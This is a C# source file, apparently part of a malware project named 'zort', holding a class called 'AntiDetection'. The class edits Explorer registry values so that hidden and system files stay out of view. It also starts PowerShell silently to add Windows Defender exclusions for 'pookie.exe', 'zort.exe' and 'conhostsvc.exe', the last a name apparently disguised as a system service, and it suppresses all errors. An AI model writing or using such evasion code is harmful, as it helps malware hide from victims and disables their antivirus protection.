using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public class AntiDetection
    {
        public static void HideHiddenFoldersFromExplorer()
        {
            try
            {
                RegistryKey explorerKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);

                if (explorerKey != null)
                {
                    object hiddenValue = explorerKey.GetValue("Hidden");
                    if (hiddenValue == null || Convert.ToInt32(hiddenValue) != 2)
                    {
                        explorerKey.SetValue("Hidden", 2, RegistryValueKind.DWord); // Hide hidden files
                    }

                    object showSuperHiddenValue = explorerKey.GetValue("ShowSuperHidden");
                    if (showSuperHiddenValue == null || Convert.ToInt32(showSuperHiddenValue) != 0)
                    {
                        explorerKey.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord); // Hide system files
                    }

                    explorerKey.Close();
                }
            }
            catch
            {
                // Handle exceptions silently
            }
        }

        internal static void AddDefenderExclusions()
        {
            AddDefenderExclusion("pookie.exe");
            AddDefenderExclusion("conhostsvc.exe");
            AddDefenderExclusion("zort.exe");
        }

        internal static void AddDefenderExclusion(string processName)
        {
            string args = $"-Command Add-MpPreference -ExclusionProcess \"{processName}\"";
            RunPSCommand(args);
        }

        internal static void RemoveDefenderExclusion(string processName)
        {
            string args = $"-Command Remove-MpPreference -ExclusionProcess \"{processName}\"";
            RunPSCommand(args);
        }

        private static void RunPSCommand(string args) {
            var process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = args;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }
    }
}
